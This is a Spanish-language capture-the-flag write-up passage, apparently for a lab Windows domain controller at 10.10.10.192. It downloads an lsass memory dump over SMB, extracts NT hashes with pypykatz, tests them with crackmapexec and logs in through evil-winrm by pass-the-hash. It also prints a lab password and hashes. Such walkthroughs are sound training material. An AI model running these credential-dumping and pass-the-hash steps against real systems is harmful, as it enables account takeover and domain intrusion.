## Vuln exploit & Gaining Access {-}

### Ganando accesso con Win-RM {-}

```bash
smbclient //10.10.10.192/forensic -U 'audit2020%s4vitar123$!'
dir
cd commands_output
get domain_users.txt
get domain_admins.txt
cd ..
cd memory_analysis
dir
get lsass.zip
```

Nos hemos descargados un fichero domain_users y un fichero domain_admins. Podemos ver un usuario **iPownedYourCompany** que nos hace
pensar que esta maquina a sido comprometida anteriormente. Tambien vemos un directorio memory_analysis y un fichero nos llama la atencion.
Este fichero es el `lsass.zip`. Nos llama la atencion porque hay una utilidad `pypykatz` con la cual podriamos ver informaciones relevantes dumpeadas
a nivel de memoria. 

```bash
unzip lsass.zip
pypykatz lsa minidump lsass.DMP
```

Aqui tenemos informaciones como usuarios y contraseña **NT** hasheadas. Los NT Hashes nos permiten hacer **PassTheHash** que simplemente seria connectarnos
con el usuario poniendo la contraseña hasheada (No se necesita conocer la contraseña en este caso).

Vemos el hash del usuario Administrator. Controlamos esto con crackmap exec.

```bash
crackmapexec smb 10.10.10.192 -u 'Administrator' -H '7f1e4ff8c5a8e6b5fcae2d9c0472cd62'
```

Pero vemos que esta credencial no es valida. Vemos otro usuario `svc_backup` lo miramos.

```bash
crackmapexec smb 10.10.10.192 -u 'svc_backup' -H '9659d1d1dcd9250115e2206d9f49400d'
```

Esta credencial esta valida. Intentamos ver si nos podemos conectar con winrm

```bash
crackmapexec winrm 10.10.10.192 -u 'svc_backup' -H '9659d1d1dcd9250115e2206d9f49400d'
```

Aqui vemos que este usuario es Pwn3d!

```bash
evil-winrm -i 10.10.10.192 -u 'svc_backup' -H '9659d1d1dcd9250115e2206d9f49400d'

whoami 
#Output
blackfield\svc_backup

ipconfig
#Output
10.10.10.192
```

Estamos conectados como el usuario svc_backup y podemos leer la flag.